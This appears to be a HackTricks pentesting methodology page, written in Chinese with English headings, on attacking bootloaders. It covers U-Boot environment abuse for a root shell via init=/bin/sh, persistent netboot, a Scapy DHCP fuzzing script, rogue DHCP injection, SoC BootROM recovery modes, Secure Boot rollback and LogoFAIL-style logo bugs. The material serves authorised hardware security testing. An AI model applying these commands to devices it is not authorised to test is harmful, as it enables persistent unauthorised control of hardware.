# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

以下步骤建议用于修改设备启动配置并测试像 U-Boot 和 UEFI 类引导程序。重点是尽早获取代码执行、评估签名/回滚保护，并滥用恢复或网络引导路径。

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- 在启动期间，在 `bootcmd` 执行前按下已知的中断键（通常是任意键、0、空格或板级的“magic”序列）以进入 U-Boot 提示符。

2. Inspect boot state and variables
- 有用的命令：
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- 追加 `init=/bin/sh` 以便内核在正常 init 之前进入 shell：
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- 配置网络并从局域网获取 kernel/fit 镜像：
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- 如果 env 存储未被写保护，你可以持久化控制：
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- 检查像 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` 这样的变量，它们会影响回退路径。错误配置的值可能允许重复进入 shell。

6. Check debug/unsafe features
- 查找：`bootdelay` > 0、`autoboot` 被禁用、无限制的 `usb start; fatload usb 0:1 ...`、通过串口使用 `loady`/`loads` 的能力、从不受信介质 `env import`，以及未进行签名检查的 kernel/ramdisk 加载。

7. U-Boot image/verification testing
- 如果平台宣称对 FIT 镜像进行安全/验证引导，尝试 unsigned 和被篡改的镜像：
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 或遗留的 `verify=n` 行为通常允许引导任意 payload。

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot 的 legacy BOOTP/DHCP 处理曾存在内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应导致的内存泄漏，可能会把 U-Boot 内存的字节 leak 回网络。对 DHCP/PXE 代码路径使用过长/边界值参数（option 67 bootfile-name、vendor options、file/servername 字段）进行测试，观察是否出现挂起或 leak。
- 用于在 netboot 期间对引导参数进行压力测试的最小 Scapy 片段：
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 还要验证当与 OS 端供应脚本链式连接时，PXE 文件名字段是否在未消毒的情况下传递给 shell/loader 逻辑。

9. Rogue DHCP server command injection testing
- 搭建一个 rogue DHCP/PXE 服务，尝试在 filename 或 options 字段中注入字符，以在引导链的后续阶段到达命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很适用。先确保将实验室网络隔离。

## SoC ROM recovery modes that override normal boot

许多 SoC 暴露一个 BootROM “loader” 模式，即使 flash 镜像无效也会接受通过 USB/UART 发送的代码。如果 secure-boot 的 eFuses/OTP 未被烧写，这通常能在链条的非常早期提供任意代码执行。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

评估设备是否有 secure-boot eFuses/OTP 被烧写。如果没有，BootROM 下载模式通常会绕过任何更高级别的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- 挂载 EFI System Partition (ESP) 并检查 loader 组件：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo 路径。
- 如果 Secure Boot 的撤销（dbx）没有更新，尝试用降级或已知存在漏洞的已签名引导组件引导。如果平台仍然信任旧的 shims/bootmanagers，通常可以从 ESP 加载自己的 kernel 或 `grub.cfg` 来获得持久性。

11. Boot logo parsing bugs (LogoFAIL class)
- 多家 OEM/IBV 固件在处理 DXE 阶段的引导 logo 图像解析时存在漏洞。如果攻击者能在 ESP 的厂商特定路径（例如 `\EFI\<vendor>\logo\*.bmp`）放置精心构造的图像并重启，即便启用了 Secure Boot，早期引导期间也可能发生代码执行。测试平台是否接受用户提供的 logo 以及这些路径是否可以从 OS 写入。

## Hardware caution

在早期引导期间与 SPI/NAND flash 交互（例如，短接引脚以绕过读取）时要谨慎，并始终查阅 flash datasheet。时序不当的短接可能会损坏设备或编程器。

## Notes and additional tips

- 试试 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与存储间移动 environment blob；一些平台允许从可移动介质导入 env 而无需认证。
- 对于通过 `extlinux.conf` 引导的基于 Linux 的系统，修改启动分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）通常足够，前提是没有强制签名检查。
- 如果用户态提供 `fw_printenv/fw_setenv`，确认 `/etc/fw_env.config` 是否与真实的 env 存储匹配。配置错误的偏移可能会让你读/写错误的 MTD 区域。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
